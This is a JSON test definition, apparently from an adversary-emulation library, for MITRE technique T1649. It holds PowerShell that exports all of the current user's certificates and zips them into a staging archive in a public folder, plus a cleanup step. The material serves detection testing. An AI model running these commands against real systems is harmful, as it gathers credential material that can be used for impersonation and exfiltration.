{
  "id": "eb121494-82d1-4148-9e2b-e624e03fbf3d",
  "name": "Staging Local Certificates via Export-Certificate",
  "description": "Export all user certificates and add to a compressed archive.\n",
  "platforms": [
    "windows"
  ],
  "steps": [
    {
      "id": "128510e0-ad3f-47d4-bef6-2475fd087d29",
      "type": "execute-command",
      "data": {
        "command": "$archive=\"$env:PUBLIC\\T1649\\atomic_certs.zip\"\n$exfilpath=\"$env:PUBLIC\\T1649\\certs\"\nAdd-Type -assembly \"system.io.compression.filesystem\"\nRemove-Item $(split-path $exfilpath) -Recurse -Force -ErrorAction Ignore\nmkdir $exfilpath | Out-Null\nforeach ($cert in (gci Cert:\\CurrentUser\\My)) { Export-Certificate -Cert $cert -FilePath $exfilpath\\$($cert.FriendlyName).cer}\n[io.compression.zipfile]::CreateFromDirectory($exfilpath, $archive)",
        "command_type": "powershell"
      },
      "elevation_required": false
    },
    {
      "id": "9dba1fdf-4176-4abc-bb33-e14bb040f9ed",
      "type": "execute-command",
      "data": {
        "command": "$exfilpath=\"$env:PUBLIC\\T1649\\certs\"\nRemove-Item $(split-path $exfilpath) -Recurse -Force -ErrorAction Ignore",
        "command_type": "powershell"
      },
      "elevation_required": false
    }
  ],
  "flows": [
    {
      "s": "128510e0-ad3f-47d4-bef6-2475fd087d29",
      "p": "on-success",
      "o": "9dba1fdf-4176-4abc-bb33-e14bb040f9ed"
    },
    {
      "s": "128510e0-ad3f-47d4-bef6-2475fd087d29",
      "p": "on-failure",
      "o": "9dba1fdf-4176-4abc-bb33-e14bb040f9ed"
    }
  ],
  "tags": [
    "T1649"
  ],
  "input_arguments": null
}